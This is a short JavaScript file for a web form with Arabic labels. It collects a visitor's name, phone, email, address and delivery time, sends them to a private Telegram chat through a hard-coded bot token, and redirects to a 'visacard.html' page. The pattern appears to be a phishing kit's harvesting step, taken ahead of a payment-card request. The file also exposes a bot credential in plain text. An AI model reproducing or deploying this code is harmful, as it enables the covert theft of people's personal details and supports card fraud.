document.getElementById("loginot2").addEventListener("click", function () {
    window.location.href = "index.html";
  });
  
  const token = "7567367004:AAGG3iwWYOvR9NwvLeUQRG49WVNBcdtFTcM";
  const chatId = "7595871538";
  
  document.getElementById("form1").addEventListener("submit", function (e) {
    e.preventDefault();
  
    const name = document.getElementById("userName").value.trim();
    const phone = this.phone.value.trim();
    const email = this.email.value.trim();
    const address1 = document.getElementById("address1").value.trim();
    const address2 = document.getElementById("address2").value.trim();
    const deliveryTime = this.delivery_time.value;
  
    // تخزين الاسم في localStorage
    localStorage.setItem("storedUserName", name);
  
    const message = `
  📥 زبون جديد:
  👤 الاسم: ${name}
  📞 الهاتف: ${phone}
  📧 البريد الإلكتروني: ${email}
  📍 العنوان: ${address1}
  🏙️ المحافظة: ${address2}
  ⏰ موعد التوصيل: ${deliveryTime}
    `;
  
    fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message
      })
    })
      .then(response => {
        if (response.ok) {
          window.location.href = "visacard.html";
        } else {
          alert("فشل في إرسال البيانات.");
        }
      })
      .catch(error => {
        console.error("⚠️ خطأ في الاتصال:", error);
        alert("حدث خطأ أثناء الإرسال.");
      });
  });
  